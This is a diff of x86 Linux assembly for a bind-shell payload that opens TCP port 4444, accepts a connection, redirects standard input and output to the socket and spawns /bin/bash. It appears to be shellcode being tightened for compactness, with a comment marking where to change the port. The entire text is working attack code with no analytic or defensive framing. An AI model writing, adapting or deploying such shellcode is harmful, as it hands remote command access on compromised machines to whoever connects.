@@ -11,13 +11,16 @@ _start:
 
     ; Create TCP socket
     ; host_sockfd = socket(AF_INET, SOCK_STREAM, 0)
-    push edx		; ipproto_ip, EDX = 0
-    inc ebx             ; sock_stream, EBX = 1
-    push ebx
-    push 0x2		; pf_inet
+    xor edx, edx	; edx = 0
+    push edx		; ipproto_ip = 0
+    xor ebx, ebx	; ebx = 0
+    inc ebx		; ebx = 1
+    push ebx		; sock_stream = 1
+    push byte 0x2	; pf_inet = 2
+
     mov ecx, esp	; ECX points to args on stack
-    push 0x66           ; socketcall
-    pop eax             ; EAX = 0x66
+    push byte 0x66	; socketcall = 102
+    pop eax		; EAX = 0x66
     int 0x80		; syscall
     xchg esi, eax	; store sockfd
 
@@ -25,65 +28,68 @@ _start:
     ; Bind socket
     ; bind(host_sockfd, (struct sockaddr *) &host_addr, sizeof(host_addr))
     push edx		; sin_addr = 0
-    inc ebx             ; sys_bind, EBX = 2 
-    push word 0x5c11	; sin_port = 4444
+    inc ebx		; sys_bind, EBX = 2
+    push word 0x5c11	; sin_port = 4444	[!] Change port here (0x115c == 4444)
     push bx		; sin_family = 2
-    mov ecx, esp        ; ECX points to struct sockaddr
 
+    mov ecx, esp	; ECX points to struct sockaddr
     push 0x10		; sizeof(host_addr)
     push ecx		; pointer to sockaddr
     push esi		; sockfd
-    mov ecx, esp        ; ECX points to args on stack
-    push 0x66           ; socketcall
-    pop eax             ; EAX = 0x66
+
+    mov ecx, esp	; ECX points to args on stack
+    push byte 0x66	; socketcall = 102
+    pop eax		; EAX = 0x66
     int 0x80            ; syscall
 
 
     ; Listen on socket
     ; listen(host_sockfd, 3);
     inc ebx		; EBX = 3
-    push ebx		; backlog incoming connections
+    push ebx		; backlog connections = 3
     inc ebx             ; sys_listen, EBX = 4
     push esi            ; sockfd
+
     mov ecx, esp        ; ECX points to args on stack
-    push 0x66           ; socketcall
+    push byte 0x66      ; socketcall = 102
     pop eax             ; EAX = 0x66
     int 0x80            ; syscall
 
 
     ; Accept connection
     ; clnt_sockfd = accept(host_sockfd, NULL, NULL)
-    inc ebx             ; sys_accept, EBX = 5
     push edx		; NULL
     push edx		; NULL
     push esi            ; sockfd
+    inc ebx             ; sys_accept, EBX = 5
+
     mov ecx, esp        ; ECX points to args on stack
-    push 0x66           ; socketcall
+    push byte 0x66      ; socketcall = 102
     pop eax             ; EAX = 0x66
-    int 0x80            ; syscall
+    int 0x80		; syscall
 
 
     ; Duplicate file descriptors
     ; dup2(clnt_sockfd, 0), dup2(clnt_sockfd, 1), dup2(clnt_sockfd, 2)
-    xchg ebx, eax       ; store sockfd
-    mov ecx, edx        ; ECX = 0
-    mov eax, 0x3f	; dup2()
-    int 0x80            ; syscall
-    inc ecx		; ECX = 1
-    mov eax, 0x3f       ; dup2()
-    int 0x80            ; syscall
-    inc ecx             ; ECX = 2
-    mov eax, 0x3f       ; dup2()
-    int 0x80            ; syscall
+    xchg ebx, eax	; store sockfd
+    push byte 0x2	; counter for loop
+    pop ecx		; ECX = 2
+
+    loop:
+          mov al, 0x3f	; dup2() = 63
+          int 0x80	; syscall
+          dec ecx	; counter -1
+    jns loop
 
 
     ; Spawn /bin/bash
     ; execve("/bin/bash", NULL, NULL)
-    push edx		; null-terminator
-    mov eax, 0x0b       ; execve
+    push edx		; Terminator = 0
+    mov al, 0x0b	; execve
     push 0x68736162	; push ////bin/bash on stack
     push 0x2f6e6962
     push 0x2f2f2f2f
-    mov ebx, esp        ; EBX points to args on stack
-    mov ecx, edx        ; ECX = 0
-    int 0x80            ; syscall
+
+    mov ebx, esp	; EBX points to args on stack
+    mov ecx, edx	; ECX = 0
+    int 0x80		; syscall
